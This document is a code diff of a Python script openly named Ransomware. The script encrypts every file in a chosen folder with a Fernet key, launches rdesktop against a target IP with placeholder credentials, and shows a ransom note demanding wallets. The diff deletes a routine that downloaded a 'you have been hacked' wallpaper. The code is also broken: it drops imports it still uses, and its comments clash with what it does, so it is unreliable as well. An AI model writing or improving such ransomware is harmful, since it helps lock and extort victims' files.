@@ -1,14 +1,7 @@
 # Sierra Maldonado
 #!/usr/bin/env python3
 import os
-import datetime
-import urllib.request
 import subprocess
-import win32api
-import win32con
-import win32ts
-from cryptography.fernet import Fernet
-from menu import Menu, MenuItem
 
 # Functions to write key and load key
 def write_key():
@@ -27,29 +20,50 @@ class Ransomware:
             write_key()
         self.key = load_key()
 
-    # Encrypt all files in a folder on a different VM using RDP
+    # Encrypt all files in a folder on a different VM using SSH
     def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
-        user_token = win32ts.WTSQueryUserToken(win32ts.WTSGetActiveConsoleSessionId())
-        command = f'python ransomware.py encrypt "{folder_path}"'
-        win32api.CreateProcessAsUser(user_token, None, command, None, None, True, win32con.NORMAL_PRIORITY_CLASS, None, None, win32api.STARTUPINFO())
+        # Establish RDP connection
+        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
+        subprocess.run(rdp_command, shell=True)
+
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                with open(file_path, 'rb') as f:
+                    data = f.read()
+
+                fernet = Fernet(self.key)
+                encrypted = fernet.encrypt(data)
+
+                with open(file_path, 'wb') as f:
+                    f.write(encrypted)
 
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
-        user_token = win32ts.WTSQueryUserToken(win32ts.WTSGetActiveConsoleSessionId())
-        command = f'python ransomware.py decrypt "{folder_path}"'
-        win32api.CreateProcessAsUser(user_token, None, command, None, None, True, win32con.NORMAL_PRIORITY_CLASS, None, None, win32api.STARTUPINFO())
+        # Establish RDP connection
+        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
+        subprocess.run(rdp_command, shell=True)
 
-    # Change Desktop Background on Windows using RDP
-    def change_background(self):
-        image_url = "https://www.unigamesity.com/wp-content/uploads/2009/05/you-have-been-hacked.jpg"
-        path = "C:\\path\\to\\wallpaper.jpg"  # Update the path accordingly
-        urllib.request.urlretrieve(image_url, path)
-        win32api.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, 0, path, win32con.SPIF_UPDATEINIFILE)
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                with open(file_path, 'rb') as f:
+                    data = f.read()
+
+                fernet = Fernet(self.key)
+                decrypted = fernet.decrypt(data)
+
+                with open(file_path, 'wb') as f:
+                    f.write(decrypted)
 
     # Display Ransom Note as Popup on Windows using RDP
     def ransom_note(self):
+        # Establish RDP connection
+        rdp_command = "rdesktop -u your_username -p your_password target_vm_ip"
+        subprocess.run(rdp_command, shell=True)
+
         ransom_note_text = "You have been bamboozled by the Black Fox Bandits. Please hand over your wallets."
-        win32api.MessageBox(0, ransom_note_text, "Ransom Note", win32con.MB_OK)
+        subprocess.run(f"msg * {ransom_note_text}", shell=True)
 
     def attack_windows_server(self):
         target_ip = input("Enter the target IP address: ")
@@ -57,14 +71,12 @@ class Ransomware:
         # Create menu items
         encrypt_item = MenuItem("Encrypt", lambda: self.encrypt_folder_on_vm(target_ip, input("Enter the folder path to encrypt: ")))
         popup_item = MenuItem("Pop-up", self.ransom_note)
-        background_item = MenuItem("Background", self.change_background)
         decrypt_item = MenuItem("Decrypt", lambda: self.decrypt_folder_on_vm(target_ip, input("Enter the folder path to decrypt: ")))
         exit_item = MenuItem("Exit", exit)
 
         # Create menu
-        menu = Menu([encrypt_item, popup_item, background_item, decrypt_item, exit_item])
+        menu = Menu([encrypt_item, popup_item, decrypt_item, exit_item])
         menu.show()
 
 ransomware = Ransomware()
 ransomware.attack_windows_server()
-
